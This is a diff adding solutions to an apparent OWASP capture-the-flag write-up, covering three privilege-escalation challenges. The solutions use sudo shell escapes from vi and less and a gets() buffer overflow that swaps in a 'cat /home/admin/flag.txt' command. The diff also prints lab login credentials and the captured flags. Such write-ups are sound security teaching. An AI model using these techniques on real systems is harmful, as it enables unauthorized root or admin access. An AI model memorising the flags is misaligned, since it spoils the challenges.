@@ -5,12 +5,59 @@
 Connection : ssh challenge@owasp.zhack.ca -p 1507
 Password : password
 
+Use sudo -l to discover what we can do.
+
+```bash
+challenge@19694104e162:~$ sudo -l
+Matching Defaults entries for challenge on 19694104e162:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User challenge may run the following commands on 19694104e162:
+    (admin) NOPASSWD: /usr/bin/vi /home/admin/message.txt
+
+challenge@19694104e162:~$ sudo -u admin /usr/bin/vi /home/admin/message.txt
+```
+From within vi enter:
+
+```bash
+! /bin/bash
+```
+To start a bash shell as admin, and get the contents of the flag.
+
+```bash
+cat /home/admin/flag.txt
+FLAG-b13886a1ff3d93049b967b10ba69b413
+```
+
 ## Privilege Escalation 2
 >Find a way to elevate your privileges to 'admin'
 Connection : ssh challenge@owasp.zhack.ca -p 1503
 Password : password
 
-## Upload 
+This looks familiar...
+
+```bash
+challenge@b28eab14b780:~$ sudo -l
+Matching Defaults entries for challenge on b28eab14b780:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User challenge may run the following commands on b28eab14b780:
+    (admin) NOPASSWD: /bin/less /home/admin/log.txt
+
+sudo -u admin /bin/less /home/admin/log.txt
+```
+
+Just to mix it up a bit, enter the following from within less:
+
+```bash
+! cat /home/admin/flag.txt
+FLAG-9d91493202554a1b0be924f19c741dbe
+```
+
+
+## Upload
 >Find a way to view the flag in index.php
 
 Upload a test file to find out the upload path.
@@ -137,6 +184,70 @@ if (isset($_GET['search'])) {
 >Find a way to elevate your privileges to 'admin'
 Connection : ssh challenge@owasp.zhack.ca -p 1504
 Password : password
+
+This one was really cool. First figure out what permissions we have:
+
+```bash
+sudo -l
+
+challenge@01720a5d8de3:/home/admin$ sudo -u admin /home/admin/challenge
+```
+
+challenge is the compiled binary of this c program, which resides in the same directory.
+
+```C
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+#include <unistd.h>
+
+void main() {
+        if (seteuid(1001) == -1 || setuid(1001) == -1 || setegid(1001) == -1 || setgid(1001) == -1) {
+                printf("Error for 'setuid'\n");
+        }
+
+        char command[100];
+        char user[20];
+
+        puts("Command : ");
+        gets(command);
+
+        if (strcmp(command, "ls") != 0 && strcmp(command, "echo 'Hello World!'") != 0) {
+                puts("Valid command are : ");
+                puts(" - ls");
+                puts(" - echo 'Hello World!'");
+                exit(0);
+        }
+
+        puts("User : ");
+        gets(user);
+
+        write(1, "Hello ", 6);
+        write(1, user, strlen(user));
+        puts("!");
+
+        system(command);
+```
+
+Interesting from the gets manual page:
+
+>Never use gets().  Because it is impossible to tell without knowing the data in advance how many characters gets() will read,  and  because  gets()
+   	will  continue to store characters past the end of the buffer, it is extremely dangerous to use.  It has been used to break computer security.  Use
+   	fgets() instead.
+
+Since the program doesn't verify the length of the input, we can perform a buffer overflow via a long input and override the value of the command variable on the stack. This is useful, because it's done after the variable has already passed the programs checks for legitimacy.
+
+In Practice, it looks like this:
+
+```bash
+challenge@01720a5d8de3:/home/admin$ sudo -u admin /home/admin/challenge
+Command :
+ls
+User :
+ABCDEFGHIJKLMNOPQRSTUVWXYZA1B1C1cat /home/admin/flag.txt
+Hello ABCDEFGHIJKLMNOPQRSTUVWXYZA1B1C1cat /home/admin/flag.txt!
+FLAG-d0b82ec683f845f7b4d74fec13212224
+```
 
 ## SQL Injection 1
 >Find the flag in the database
